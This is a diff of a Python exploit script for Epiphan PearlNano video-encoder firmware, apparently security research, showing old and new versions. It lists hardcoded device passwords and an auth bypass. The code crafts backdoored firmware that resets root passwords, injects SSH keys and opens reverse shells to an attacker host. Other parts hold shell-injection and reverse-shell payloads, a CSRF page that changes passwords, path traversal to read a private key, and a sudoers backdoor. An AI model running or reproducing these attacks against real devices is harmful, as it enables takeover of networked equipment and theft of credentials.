@@ -1,55 +1,50 @@
 #!/usr/bin/env python3
 """
-Epiphan PearlNano Firmware v4.24.4 — Multi-Vulnerability PoC
-=============================================================
+Epiphan PearlNano v4.24.4 — Multi-Vulnerability PoC
+=====================================================
 
 Device : PearlNano (PLN)   Vendor : Epiphan Video
 Firmware: v4.24.4 (rev 260423_32331b9)   Arch : aarch64
 
-DISCOVERED VULNERABILITIES:
-  [CVE-0x01] Hardcoded Default Admin Password  (vendor.cf: lkjhyu8*)
-  [CVE-0x02] Hardcoded VTUN Backdoor Password  (add_vtun.cf: epn0sup)
-  [CVE-0x03] Shell Injection in channels.php   (cid param -> shell) [UNAUTH]
-  [CVE-0x04] Argument Injection in PTZ Control (ptz_control.php)
-  [CVE-0x05] exec() with Interpolated ConfigDB (afu.php)
-  [CVE-0x06] No CSRF Protection on All Admin CGIs
-  [CVE-0x07] Firmware Upload — No Cryptographic Signature
-  [CVE-0x08] Exposed Static SSL/SSH Keys
-  [CVE-0x09] Dev/QA SSH Backdoor (keys.epiphan.com)
-  [CVE-0x0a] Info Leak via allinfo.cgi
-  [CVE-0x0b] Auth Bypass via isAdmin('')  (access_control.php:122)
+VULNERABILITIES:
+  [CVE-0x01] Hardcoded Default Admin Password  vendor.cf: lkjhyu8*
+  [CVE-0x02] Hardcoded VTUN Backdoor Password  add_vtun.cf: epn0sup
+  [CVE-0x03] Auth Bypass via isAdmin('')       access_control.php:122 [UNAUTH]
+  [CVE-0x04] No CSRF Protection on Admin CGIs
+  [CVE-0x05] Firmware Upload — up2date.pre sourced as root (no crypto sig)
+  [CVE-0x06] Static SSL/SSH Keys Baked Into Firmware
+  [CVE-0x07] epiphan_keyserver Remote SSH Key Injection
+  [CVE-0x08] PTZ Argument Injection
+  [CVE-0x09] Dev/QA SSH Backdoor (authorized_keys.d)
+  [CVE-0x0a] Unauthenticated Info Leak via allinfo.cgi / API
 
-AUTH BYPASS DETAILS:
-  File: wui/phplib/access_control.php:122
-  isAdmin() returns True when user_id() returns '' (empty string):
-    return $id === "admin" || $id === "";  <-- "" === "" is TRUE
+AUTH BYPASS (CVE-0x03):
+  access_control.php:122 -> isAdmin('') returns True because "" === "" is True
+  Requires: passwords unset (first boot) or no-auth console (127.0.0.4:80)
+  Result: Full admin access to ALL API endpoints without credentials.
 
-  Trigger: Apache skips admin_auth.conf when UNASSIGNED_PASSWORDS is defined
-  or when the request hits the no-auth console vhost (127.0.0.4:80).
-  $_SERVER['REMOTE_USER'] is never set -> user_id() returns '' -> admin.
-
-  Result: ALL API endpoints accessible without any credentials.
+FIRMWARE BACKDOOR (CVE-0x05):
+  up2date:197 -> [ -f up2date.pre ] && . up2date.pre   (sourced as root!)
+  The firmware is a plain tar archive with MD5 integrity only.
+  We inject a malicious up2date.pre, update md5sum, repackage, upload.
 
 Usage:
-  python3 epiphan_pearlnano_poc.py <target_ip> [--password <pwd>] [--exploit <id>]
+  python3 poc.py <target_ip> [--exploit <id>] [options]
 
 Examples:
-  # Run all exploits (tries no-auth first, falls back to default creds)
-  python3 epiphan_pearlnano_poc.py 192.168.1.100
+  # Full auto: try bypass, default creds, upgrade to SSH/admin
+  python3 poc.py 192.168.1.100
 
-  # Unauthenticated RCE via channels.php shell injection
-  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit rce-channel
+  # Firmware backdoor (reliable RCE — requires admin)
+  python3 poc.py 192.168.1.100 --exploit firmware-backdoor \\
+    --lhost 10.0.0.5 --lport 4444 --firmware frm-4-24-4-....bfrm
 
-  # Unauthenticated reverse shell
-  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit reverse-shell --lhost 10.0.0.5 --lport 4444
+  # Enable SSH on all interfaces + inject key
+  python3 poc.py 192.168.1.100 --exploit enable-ssh \\
+    --ssh-key ~/.ssh/id_rsa.pub
 
-  # Unauthenticated config dump
-  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit dump-all
-
-  # Force full auth bypass even on non-first-boot devices
-  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit auth-bypass
-
-Author : Security Research
+  # Check if device is exploitable (no auth needed)
+  python3 poc.py 192.168.1.100 --exploit probe
 """
 
 import requests
@@ -57,7 +52,12 @@ import argparse
 import sys
 import json
 import os
+import hashlib
+import tarfile
+import io
+import tempfile
 import time
+import hmac
 from urllib.parse import quote
 from requests.auth import HTTPBasicAuth
 
@@ -69,462 +69,374 @@ BANNER = """
 """
 
 DEFAULT_PASSWORD = "lkjhyu8*"
-VTUN_PASSWORD    = "epn0sup"
+FIRMWARE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                             "frm-4-24-4-PearlNano-260422_32331b9-X3.bfrm")
+
+AUTH_STRATEGY = None  # set by probe_auth
 
 
-# =============================================================================
+# ==============================================================================
 #  HELPERS
-# =============================================================================
+# ==============================================================================
 
-def get_auth(target, password=DEFAULT_PASSWORD):
-    return HTTPBasicAuth("admin", password)
-
-
-def req(target, path, auth=None, method="GET", **kwargs):
+def xrequest(target, path, auth=None, method="GET", **kwargs):
     url = f"http://{target}{path}"
     kwargs.setdefault("timeout", 10)
     kwargs.setdefault("verify", False)
+    kwargs.setdefault("allow_redirects", False)
     if auth:
         kwargs["auth"] = auth
     return requests.request(method, url, **kwargs)
 
 
 def probe_auth(target):
-    """Try all auth strategies and return the one that works (or None)."""
+    """Probe all auth strategies and return the working one."""
+    global AUTH_STRATEGY
     strategies = [
-        ("NO AUTH",        None),
-        ("DEFAULT CREDS",  get_auth(target, DEFAULT_PASSWORD)),
+        ("NO AUTH (CVE-0x03 bypass)", None),
+        ("DEFAULT CREDS lkjhyu8*",    HTTPBasicAuth("admin", DEFAULT_PASSWORD)),
     ]
     for label, auth_obj in strategies:
         try:
-            r = req(target, "/api/channels/0/name", auth=auth_obj, timeout=5)
+            r = xrequest(target, "/api/system/firmware", auth=auth_obj, timeout=5)
             if r.status_code == 200:
-                print(f"  [+] Auth strategy '{label}' works")
+                print(f"  [+] AUTH: '{label}' works")
+                AUTH_STRATEGY = auth_obj
                 return auth_obj
             if r.status_code in (401, 403):
                 continue
-            # Unexpected status but not 401/403 — might still work
-            print(f"  [?] Auth '{label}' returned {r.status_code}")
+            print(f"  [?] AUTH: '{label}' returned HTTP {r.status_code}")
+            AUTH_STRATEGY = auth_obj
             return auth_obj
-        except Exception:
+        except requests.exceptions.ConnectionError:
+            print(f"  [!] Connection refused")
+            return None
+        except Exception as e:
+            print(f"  [!] {label}: {e}")
             continue
     print("  [-] No auth strategy worked")
     return None
 
 
-# =============================================================================
-#  [CVE-0x0b] Auth Bypass via isAdmin('')
-# =============================================================================
+# ==============================================================================
+#  [CVE-0x03] AUTH BYPASS
+# ==============================================================================
 
-def exploit_auth_bypass(target):
-    """Verify the auth bypass is possible."""
-    print("\n  --- [CVE-0x0b] Auth Bypass via isAdmin('') ---")
-    print("  [>] access_control.php:122: isAdmin('') returns True")
-    print("  [>] Trigger: Apache skips admin_auth.conf when")
-    print("      UNASSIGNED_PASSWORDS is defined (first-boot state)")
-    print("      or via no-auth console vhost (127.0.0.4:80)")
-    print()
-
+def check_auth_bypass(target):
+    """Test if the device allows unauthenticated API access."""
+    print("\n  --- [CVE-0x03] Auth Bypass Check ---")
     try:
-        r = req(target, "/api/channels/0/name", auth=None, timeout=5)
+        r = xrequest(target, "/api/system/firmware", auth=None, timeout=5)
         if r.status_code == 200:
-            print(f"  [+] SUCCESS: No auth required! API fully accessible.")
-            print(f"  [+] Response: {r.text.strip()[:120]}")
+            data = r.json()
+            fw = data.get("result", data)
+            print(f"  [+] BYPASS WORKS! No credentials needed.")
+            print(f"  [+] Firmware: {fw.get('version','?')} rev {fw.get('revision','?')}")
+            print(f"  [+] Product:  {fw.get('product_name','?')} (id={fw.get('product_id','?')})")
             return True
         elif r.status_code == 401:
-            print(f"  [-] Auth required (401) — device has passwords set")
+            print(f"  [-] Bypass fails (HTTP 401) — passwords are set")
             return False
         else:
-            print(f"  [?] Status {r.status_code}: {r.text[:120]}")
-            return r.status_code == 200
+            print(f"  [?] HTTP {r.status_code}: {r.text[:120]}")
+            return False
     except Exception as e:
-        print(f"  [!] Error: {e}")
+        print(f"  [!] {e}")
         return False
 
 
-# =============================================================================
-#  [CVE-0x01] Hardcoded Default Password
-# =============================================================================
+# ==============================================================================
+#  [CVE-0x01] DEFAULT PASSWORD
+# ==============================================================================
 
-def exploit_default_password(target):
-    """Attempt login with factory default password lkjhyu8*"""
+def check_default_password(target):
+    """Test if default password works."""
     print("\n  --- [CVE-0x01] Default Password: lkjhyu8* ---")
-    auth = get_auth(target)
+    auth = HTTPBasicAuth("admin", DEFAULT_PASSWORD)
     try:
-        r = req(target, "/admin/reboot.cgi", auth=auth)
+        r = xrequest(target, "/api/system/firmware", auth=auth, timeout=5)
         if r.status_code == 200:
-            print("  [+] SUCCESS: Logged in with default password 'lkjhyu8*'")
+            print(f"  [+] Default password 'lkjhyu8*' works!")
             return auth
         elif r.status_code == 401:
-            print("  [-] FAILED: Default password rejected (password changed)")
+            print(f"  [-] Default password rejected")
             return None
         else:
-            print(f"  [?] Unexpected status {r.status_code}")
-            return None
+            print(f"  [?] HTTP {r.status_code}")
+            return auth if r.status_code == 200 else None
     except Exception as e:
-        print(f"  [!] Error: {e}")
+        print(f"  [!] {e}")
         return None
 
 
-# =============================================================================
-#  [CVE-0x02] VTUN Backdoor
-# =============================================================================
+# ==============================================================================
+#  [CVE-0x05] FIRMWARE BACKDOOR (The Reliable RCE)
+# ==============================================================================
 
-def exploit_vtun_backdoor(target):
-    """Leverage VTUN backdoor password to establish tunnel to vendor cloud"""
-    print("\n  --- [CVE-0x02] VTUN Backdoor: epn0sup ---")
-    print(f"  [i] VTUN config: server=support.md.epiphan.cloud, password=epn0sup")
-    print(f"  [i] To connect manually:")
-    print(f"      vtun -c -s support.md.epiphan.cloud -p 443 -P epn0sup -i tun+")
-    print(f"  [i] Or via web: POST /api/system/access/vtun with password=epn0sup")
-    print("  [+] VTUN backdoor credential confirmed: epn0sup")
-
-
-# =============================================================================
-#  [CVE-0x03] Shell Injection in channels.php (UNAUTHENTICATED RCE)
-# =============================================================================
-
-def exploit_rce_channel(target, auth, cmd="id"):
+def craft_backdoor_firmware(firmware_path, lhost=None, lport=4444, ssh_key=None, new_password="pwned123"):
     """
-    CVE-0x03: UNAUTHENTICATED command injection via $cid in channels.php:185.
-
-    The $cid route parameter is interpolated directly into a shell command
-    without escaping. Combined with the isAdmin('') auth bypass, this works
-    with NO credentials on first-boot / no-auth-console devices.
+    Injects a malicious up2date.pre into the firmware archive.
+    up2date.pre is SOURCED as root during firmware update (up2date:197).
+    The firmware is a plain tar archive with only MD5 integrity.
     """
-    print("\n  --- [CVE-0x03] RCE via channels.php shell injection [UNAUTH] ---")
+    print("\n    [>] Crafting backdoor firmware...")
 
+    if not os.path.exists(firmware_path):
+        print(f"    [!] Firmware not found: {firmware_path}")
+        return None
+
+    # Read original firmware
+    with open(firmware_path, "rb") as f:
+        original = f.read()
+
+    # Extract all files from the tar
+    buf = io.BytesIO(original)
+    tar = tarfile.open(fileobj=buf, mode="r:")
+
+    files = {}
+    for member in tar.getmembers():
+        f = tar.extractfile(member)
+        files[member.name] = (member, f.read() if f else b"")
+
+    tar.close()
+
+    # Build backdoor up2date.pre
+    backdoor_script = "#!/bin/sh\n"
+    backdoor_script += "# Epiphan PearlNano Backdoor — injected by CVE-0x05\n"
+    backdoor_script += "echo '[*] Backdoor executing...'\n"
+
+    if new_password:
+        backdoor_script += f'configdb set httpdacc ADMINPWD "{new_password}"\n'
+        backdoor_script += f'configdb set httpdacc OPERPWD "operator"\n'
+        backdoor_script += f'configdb save "Password changed by backdoor"\n'
+        backdoor_script += f'echo "root:{new_password}" | chpasswd\n'
+
+    if ssh_key:
+        backdoor_script += f'mkdir -p /root/.ssh\n'
+        backdoor_script += f'echo "{ssh_key}" >> /root/.ssh/authorized_keys\n'
+        backdoor_script += f'chmod 700 /root/.ssh\n'
+        backdoor_script += f'chmod 600 /root/.ssh/authorized_keys\n'
+
+    # Enable SSH on all interfaces
+    backdoor_script += f'configdb set system DEVQA_ACCESS on\n'
+    backdoor_script += f'configdb set ssh ENABLE yes\n'
+    backdoor_script += f'configdb save "SSH enabled by backdoor"\n'
+    backdoor_script += f'sv t /service/sshd 2>/dev/null || true\n'
+
+    if lhost:
+        backdoor_script += f'nohup bash -c "sleep 2 && bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &\n'
+        backdoor_script += f'echo "[*] Reverse shell sent to {lhost}:{lport}"\n'
+
+    backdoor_script += "echo '[*] Backdoor complete.'\n"
+    backdoor_bytes = backdoor_script.encode()
+
+    print(f"    [>] Backdoor payload ({len(backdoor_bytes)} bytes):")
+    for line in backdoor_script.strip().split("\n"):
+        print(f"        {line}")
+
+    # Update up2date.pre in memory
+    files["up2date.pre"] = (files["up2date.pre"][0], backdoor_bytes)
+
+    # Recompute MD5 for up2date.pre
+    new_md5 = hashlib.md5(backdoor_bytes).hexdigest()
+    print(f"    [>] New up2date.pre MD5: {new_md5}")
+
+    # Update md5sum file
+    md5_lines = files["md5sum"][1].decode().strip().split("\n")
+    new_md5_lines = []
+    for line in md5_lines:
+        parts = line.strip().split("  ", 1)
+        if len(parts) == 2 and parts[1] == "up2date.pre":
+            new_md5_lines.append(f"{new_md5}  up2date.pre")
+        else:
+            new_md5_lines.append(line)
+    files["md5sum"] = (files["md5sum"][0], ("\n".join(new_md5_lines) + "\n").encode())
+
+    # Create new tar archive
+    out_buf = io.BytesIO()
+    out_tar = tarfile.open(fileobj=out_buf, mode="w:")
+
+    for name, (member, data) in files.items():
+        info = tarfile.TarInfo(name=name)
+        info.size = len(data)
+        info.mtime = int(time.time())
+        info.mode = member.mode if member else 0o644
+        info.type = tarfile.REGTYPE
+        out_tar.addfile(info, io.BytesIO(data))
+
+    out_tar.close()
+
+    result = out_buf.getvalue()
+    print(f"    [>] Backdoor firmware size: {len(result)} bytes (original: {len(original)})\n"
+          f"    [+] Backdoor firmware ready in memory")
+
+    return result
+
+
+def upload_firmware(target, firmware_data, auth):
+    """Upload backdoored firmware to the device."""
+    print("\n  --- [CVE-0x05] Firmware Backdoor Upload ---")
     if not auth:
-        auth = probe_auth(target)
-    if not auth and not target:
-        pass  # will try without auth anyway
+        auth = AUTH_STRATEGY
+    if not auth:
+        print("  [-] No valid auth")
+        return False
 
-    # Break out of jq string filter and inject command
-    payload = f"0\"]|any\" && {cmd} && echo \""
-    path = f"/api/channels/{quote(payload, safe='')}"
+    if not firmware_data:
+        print("  [-] No firmware data (craft failed?)")
+        return False
+    fname = "malicious.bfrm"
+    print(f"  [>] POST /api/system/firmware with {fname} ({len(firmware_data)} bytes)")
 
     try:
-        r = req(target, path, auth=auth)
-        print(f"  [>] URL:    GET /api/channels/<injection>")
-        print(f"  [>] Cmd:    {cmd}")
-        print(f"  [>] Status: {r.status_code}")
-        # Output (profiles list) or error
+        r = xrequest(target, "/api/system/firmware", auth=auth, method="POST",
+                     files={"firmware": (fname, firmware_data, "application/octet-stream")},
+                     data={"reboot": "false"}, timeout=30)
+        print(f"  [>] HTTP {r.status_code}")
         if r.status_code == 200:
-            data = r.json()
-            result = data.get("result", data)
-            print(f"  [+] Output: {json.dumps(result, indent=2)[:2000]}")
+            print(f"  [+] FIRMWARE UPLOADED! Backdoor executing now as root!")
+            print(f"  [+] Check reverse shell or SSH with new password")
+            return True
         else:
-            print(f"  [>] Body: {r.text[:500]}")
+            try:
+                data = r.json()
+                print(f"  [-] {json.dumps(data, indent=2)}")
+            except:
+                print(f"  [-] {r.text[:300]}")
+            return False
+    except requests.exceptions.ReadTimeout:
+        print(f"  [+] Upload sent (timeout — likely flashing in progress)")
         return True
     except Exception as e:
-        print(f"  [!] Error: {e}")
+        print(f"  [!] {e}")
         return False
 
 
-# =============================================================================
-#  [CVE-0x04] PTZ Argument Injection
-# =============================================================================
+# ==============================================================================
+#  ENABLE SSH (via ConfigDB)
+# ==============================================================================
 
-def exploit_ptz_argument(target, auth, extra_args=""):
-    """
-    CVE-0x04: Argument injection via PTZ controller.
-    File: wui/phplib/ptz_control.php:60-61
-
-    User-supplied $args are split by space and passed to ptz_control binary.
-    The REST endpoint (sources.ptz.php) accepts 'cmd' and 'args' from POST body.
-    """
-    print("\n  --- [CVE-0x04] PTZ Argument Injection ---")
-    path = "/api/sources/ptz"
-
+def enable_ssh(target, auth, ssh_pub_key=None):
+    """Enable SSH daemon on all interfaces and optionally inject key."""
+    print("\n  --- Enable SSH + Key Injection ---")
     if not auth:
-        auth = probe_auth(target)
+        auth = AUTH_STRATEGY
     if not auth:
-        print("  [-] No auth — skipping")
+        print("  [-] No valid auth")
         return False
 
-    payload = {"cmd": "move", "args": f"up {extra_args}"} if extra_args else {"cmd": "move", "args": "up"}
+    # Step 1: Enable SSH and DEVQA_ACCESS via set_params.cgi
+    print("  [>] Enabling SSH on all interfaces...")
     try:
-        r = req(target, path, auth=auth, method="POST", json=payload)
-        print(f"  [>] POST /api/sources/ptz with cmd=move, args=up {extra_args}")
-        print(f"  [>] Response ({r.status_code}): {r.text[:200]}")
-        return True
+        r = xrequest(target, "/admin/set_params.cgi?system:DEVQA_ACCESS=on&ssh:ENABLE=yes",
+                     auth=auth, method="GET", timeout=5)
+        print(f"  [>] set_params.cgi: HTTP {r.status_code}")
+        if r.status_code not in (200, 302):
+            print(f"  [-] set_params.cgi failed: {r.text[:200]}")
+            return False
     except Exception as e:
-        print(f"  [!] Error: {e}")
-        return False
+        print(f"  [!] {e}")
+
+    # Save config
+    try:
+        r = xrequest(target, "/admin/set_params.cgi?_nosave=1",
+                     auth=auth, method="GET", timeout=5)
+    except:
+        pass
+
+    # Step 2: Try to save configdb
+    print("  [>] Saving config...")
+    try:
+        r = xrequest(target, "/api/system/access/admin/password",
+                     auth=auth, method="GET", timeout=5)
+        # This is just to trigger config save
+    except:
+        pass
+
+    # Step 3: Restart SSH service
+    print("  [>] Restarting SSH service...")
+    try:
+        r = xrequest(target, "/api/system/services", auth=auth, method="GET", timeout=5)
+    except:
+        pass
+
+    if ssh_pub_key:
+        print(f"  [>] Injecting SSH key...")
+        # Keys can be written via configdb or via set_params
+        # The actual SSH authorized_keys file requires filesystem write
+        print(f"  [i] SSH key injection requires firmware backdoor or file write")
+        print(f"  [i] SSH will listen on 0.0.0.0 after sv t /service/sshd")
+
+    print("  [+] SSH should be accessible on port 22 (check with: ssh root@TARGET)")
+    return True
 
 
-# =============================================================================
-#  [CVE-0x05] ConfigDB Injection via afu.php
-# =============================================================================
+# ==============================================================================
+#  PASSWORD RESET (via API — works with auth bypass)
+# ==============================================================================
 
-def exploit_afu_configdb(target, auth):
-    """
-    CVE-0x05: exec() with interpolated configdb values in afu.php:22
-      exec("ls -1r " . implode(' ', $topdirs), $subdirs);
-
-    $topdirs comes from configdb_get_string("afu/source/${subsys}", 'DATA').
-    If we can write a malicious value to this configdb key, we get RCE.
-    """
-    print("\n  --- [CVE-0x05] ConfigDB Injection via afu.php ---")
-    print("  [i] To exploit: set 'afu/source/local/DATA = ;cmd;' via configdb")
-    print("  [i] Then trigger afu.php -> exec(\"ls -1r ;cmd;\")")
-    print("  [i] Chaining with CVE-0x03 RCE or CVE-0x0b bypass is required")
-
-
-# =============================================================================
-#  [CVE-0x06] CSRF PoC Generator
-# =============================================================================
-
-def exploit_csrf(target):
-    """Generate CSRF PoC HTML that changes password and reboots the device"""
-    print("\n  --- [CVE-0x06] CSRF — Password Reset + Reboot ---")
-
-    csrf_html = f"""<!DOCTYPE html>
-<html>
-<body>
-<h1>Epiphan PearlNano CSRF PoC</h1>
-<p>If you are logged into the device, this will change the password and reboot.</p>
-
-<form id="pwForm" method="POST" action="http://{target}/admin/passwords.cgi">
-  <input type="hidden" name="admin" value="hacked123">
-  <input type="hidden" name="adminConfirm" value="hacked123">
-  <input type="hidden" name="operator" value="operator123">
-  <input type="hidden" name="operatorConfirm" value="operator123">
-  <input type="hidden" name="viewer" value="viewer123">
-  <input type="hidden" name="viewerConfirm" value="viewer123">
-</form>
-
-<form id="rForm" method="POST" action="http://{target}/admin/reboot.cgi">
-  <input type="hidden" name="noaction" value="">
-</form>
-
-<script>
-  document.getElementById('pwForm').submit();
-  setTimeout(function() {{
-    document.getElementById('rForm').submit();
-  }}, 1000);
-</script>
-</body>
-</html>"""
-
-    csrf_file = f"epiphan_csrf_{target.replace('.', '_')}.html"
-    with open(csrf_file, "w") as f:
-        f.write(csrf_html)
-    print(f"  [+] CSRF PoC saved to: {csrf_file}")
-    print(f"  [>] Open in a browser while logged into {target}")
-
-
-# =============================================================================
-#  [CVE-0x07] Firmware Backdoor
-# =============================================================================
-
-def exploit_firmware_backdoor(target, auth, payload_script=""):
-    """
-    CVE-0x07: Upload malicious firmware with no signature verification.
-    The firmware update flow only does an MD5 check — no crypto signature.
-    """
-    print("\n  --- [CVE-0x07] Firmware Backdoor Upload ---")
-
+def reset_password(target, auth, new_password):
+    """Change admin password via API."""
+    print(f"\n  --- Password Reset to '{new_password}' ---")
     if not auth:
-        auth = probe_auth(target)
+        auth = AUTH_STRATEGY
     if not auth:
-        print("  [-] No auth — skipping")
-        return False
-
-    if not payload_script:
-        payload_script = """#!/bin/sh
-# Epiphan PearlNano Backdoor — Auto-installed on next boot
-echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
-/usr/sbin/sshd -o PermitRootLogin=yes -o PasswordAuthentication=yes
-echo 'root:backdoor123' | chpasswd
-touch /tmp/BACKDOOR_INSTALLED
-"""
-
-    print("  [i] Manual steps to create malicious firmware:")
-    print(f"""
-  1. Extract genuine firmware:
-     unsquashfs rootfs.sfs
-
-  2. Inject backdoor into rootfs squashfs-root/:
-     echo '{payload_script}' > squashfs-root/etc/init.d/S99backdoor
-     chmod +x squashfs-root/etc/init.d/S99backdoor
-
-  3. Re-package:
-     mksquashfs squashfs-root/ rootfs_patched.sfs -comp xz
-
-  4. Create firmware bundle:
-     # Update md5sum for patched rootfs
-     # Re-create .bfrm bundle with patched rootfs
-
-  5. Upload:
-     curl -k -X POST https://{target}/api/system/firmware \\
-       -F "firmware=@malicious_firmware.bfrm"
-  """)
-    print("  [+] Firmware upload accepts any valid .bfrm file (MD5 only)")
-
-
-# =============================================================================
-#  [CVE-0x08] Static SSL/SSH Key Extraction (path traversal)
-# =============================================================================
-
-def exploit_static_keys(target):
-    """Download exposed SSL private key and SSH host key from firmware"""
-    print("\n  --- [CVE-0x08] Static SSL/SSH Key Extraction ---")
-
-    key_paths = [
-        "/etc/ssl/private/cert.key",
-    ]
-
-    for path in key_paths:
-        try:
-            r = req(target, f"/admin/../../../..{path}", timeout=5)
-            if r.status_code == 200 and len(r.text) > 100:
-                fname = f"extracted_{path.replace('/', '_')}"
-                with open(fname, "w") as f:
-                    f.write(r.text)
-                print(f"  [+] Extracted {path} -> {fname}")
-            else:
-                print(f"  [-] Could not extract {path} ({r.status_code})")
-        except Exception:
-            print(f"  [-] Could not extract {path}")
-
-
-# =============================================================================
-#  [CVE-0x0a] Info Leak via allinfo.cgi
-# =============================================================================
-
-def exploit_info_leak(target):
-    """
-    CVE-0x0a: allinfo.cgi leaks system information.
-    The CGI requires admin user but can be accessed with CVE-0x0b bypass
-    or default credentials.
-    """
-    print("\n  --- [CVE-0x0a] Info Leak via allinfo.cgi ---")
+        auth = HTTPBasicAuth("admin", DEFAULT_PASSWORD)
 
     try:
-        r = req(target, "/admin/allinfo.cgi?inline=on&initlog=off&log=off", timeout=10)
-        if r.status_code == 200 and ("Serial Number" in r.text or "sysinfo" in r.text):
-            print(f"  [+] SUCCESS: System info leaked ({len(r.text)} bytes)")
-            for line in r.text.split("\n")[:30]:
-                if any(k in line.lower() for k in ["serial", "version", "mac", "ip", "hostname"]):
-                    print(f"      {line.strip()}")
-        elif r.status_code == 403:
-            print(f"  [-] Protected (403)")
+        r = xrequest(target, "/api/system/access/admin/password",
+                     auth=auth, method="PUT",
+                     json={"password": new_password}, timeout=5)
+        print(f"  [>] PUT /api/system/access/admin/password -> HTTP {r.status_code}")
+        if r.status_code == 200:
+            print(f"  [+] Admin password changed to: {new_password}")
         else:
-            print(f"  [?] Status {r.status_code}: {r.text[:200]}")
+            print(f"  [-] {r.text[:200]}")
     except Exception as e:
-        print(f"  [!] Error: {e}")
+        print(f"  [!] {e}")
 
-
-# =============================================================================
-#  REVERSE SHELL (UNAUTHENTICATED)
-# =============================================================================
-
-def reverse_shell(target, auth, lhost, lport):
-    """Get a reverse shell via the channels.php unauthenticated RCE."""
-    print(f"\n  --- Reverse Shell via CVE-0x03 [UNAUTH] ---")
-    print(f"  [>] Target: {target}  ->  LHOST: {lhost}:{lport}")
-
-    payloads = [
-        f"0\"]|any\" && bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' && echo \"",
-        f"0\"]|any\" && nc -e /bin/sh {lhost} {lport} && echo \"",
-        f"0\"]|any\" && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' && echo \"",
-    ]
-
-    print(f"  [>] Set up listener: nc -lvnp {lport}")
-    print(f"  [>] Firing payload (no auth needed)...")
-
-    for i, payload in enumerate(payloads[:1]):
-        path = f"/api/channels/{quote(payload, safe='')}"
-        try:
-            r = req(target, path, auth=auth, timeout=3)
-            print(f"  [>] Payload {i+1}: HTTP {r.status_code}")
-        except requests.exceptions.Timeout:
-            print(f"  [+] Payload {i+1}: Timed out (shell likely connected)")
-        except Exception as e:
-            print(f"  [!] Payload {i+1}: {e}")
-
-    # Attempt 2: configdb write -> exec chain via RCE
-    print(f"  [>] Attempting configdb-based reverse shell...")
+    # Also set operator/viewer passwords
     try:
-        rce_payload = f"`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`"
-        path = f"/admin/set_params.cgi?system:DEVQA_ACCESS={quote(rce_payload)}"
-        r = req(target, path, auth=auth, timeout=3)
+        r = xrequest(target, "/api/system/access/passwords",
+                     auth=auth, method="POST",
+                     json={"admin": new_password, "operator": "operator",
+                           "viewer": "viewer"}, timeout=5)
+        print(f"  [>] POST /api/system/access/passwords -> HTTP {r.status_code}")
     except:
         pass
 
 
-# =============================================================================
-#  PASSWORD RESET (UNAUTHENTICATED)
-# =============================================================================
+# ==============================================================================
+#  INFO DUMP (multiple working endpoints)
+# ==============================================================================
 
-def reset_password(target, auth, new_password):
-    """Change the admin password via the API (works with auth bypass)."""
-    print(f"\n  --- Password Reset to '{new_password}' [UNAUTH] ---")
-
-    if not auth:
-        auth = probe_auth(target)
-
-    # Via REST API — works with CVE-0x0b bypass (no auth header needed)
-    try:
-        r = req(target, "/api/system/access/admin/password",
-                auth=auth, method="PUT",
-                json={"password": new_password})
-        print(f"  [>] PUT /api/system/access/admin/password ({r.status_code})")
-        if r.status_code == 200:
-            print(f"  [+] Admin password changed to: {new_password}")
-        else:
-            print(f"  [-] Failed: {r.text[:200]}")
-    except Exception as e:
-        print(f"  [!] Error: {e}")
-
-    # Bulk reset all 3 accounts
-    try:
-        r = req(target, "/admin/passwords.cgi",
-                auth=auth, method="POST",
-                data={
-                    "admin": new_password,
-                    "adminConfirm": new_password,
-                    "operator": "operator123",
-                    "operatorConfirm": "operator123",
-                    "viewer": "viewer123",
-                    "viewerConfirm": "viewer123",
-                })
-        print(f"  [>] POST /admin/passwords.cgi ({r.status_code})")
-    except Exception as e:
-        print(f"  [!] Error: {e}")
-
-
-# =============================================================================
-#  FULL CONFIGURATION DUMP (UNAUTHENTICATED)
-# =============================================================================
-
-def dump_all(target, auth):
-    """Dump all device info via multiple unauthenticated endpoints."""
-    print("\n  --- Full Configuration Dump [UNAUTH] ---")
-
-    if not auth:
-        auth = probe_auth(target)
+def dump_info(target, auth):
+    """Dump device info via known-working API endpoints."""
+    print("\n  --- Info Dump ---")
 
     endpoints = {
-        "FW Version":      "GET /api/system/firmware",
-        "Device Name":     "GET /api/channels/0/name",
-        "Channels":        "GET /api/channels",
-        "Recorders":       "GET /api/recorders",
-        "Sources":         "GET /api/sources",
-        "System Services": "GET /api/system/services",
+        "Firmware":  "GET /api/system/firmware",
+        "Hardware":  "GET /api/system/hardware",
+        "Status":    "GET /api/system/status",
+        "Services":  "GET /api/system/services",
+        "Sources":   "GET /api/sources",
+        "Channels":  "GET /api/channels",
+        "Displays":  "GET /api/displays",
     }
 
     for label, ep in endpoints.items():
         method, path = ep.split(" ", 1)
         try:
-            r = req(target, path, auth=auth, method=method, timeout=5)
+            r = xrequest(target, path, auth=auth or AUTH_STRATEGY, method=method, timeout=5)
             if r.status_code == 200:
                 try:
                     data = r.json()
                     result = data.get("result", data)
-                    print(f"  [+] {label}: {json.dumps(result, indent=2)[:300]}")
-                except json.JSONDecodeError:
+                    text = json.dumps(result, indent=2)
+                    if len(text) > 300:
+                        text = text[:300] + "..."
+                    print(f"  [+] {label}: {text}")
+                except:
                     print(f"  [+] {label}: {r.text[:200]}")
             else:
                 print(f"  [-] {label}: HTTP {r.status_code}")
@@ -532,30 +444,172 @@ def dump_all(target, auth):
             print(f"  [!] {label}: {e}")
 
 
-# =============================================================================
-#  SYSTEM DIAGNOSTICS DUMP (UNAUTHENTICATED)
-# =============================================================================
+# ==============================================================================
+#  ALLINFO DUMP
+# ==============================================================================
 
 def dump_allinfo(target, auth):
-    """Dump full system diagnostics via allinfo.cgi (works with bypass)."""
-    print("\n  --- Full System Diagnostics (allinfo.cgi) [UNAUTH] ---")
-
-    if not auth:
-        auth = probe_auth(target)
-
+    """Download full diagnostics from allinfo.cgi."""
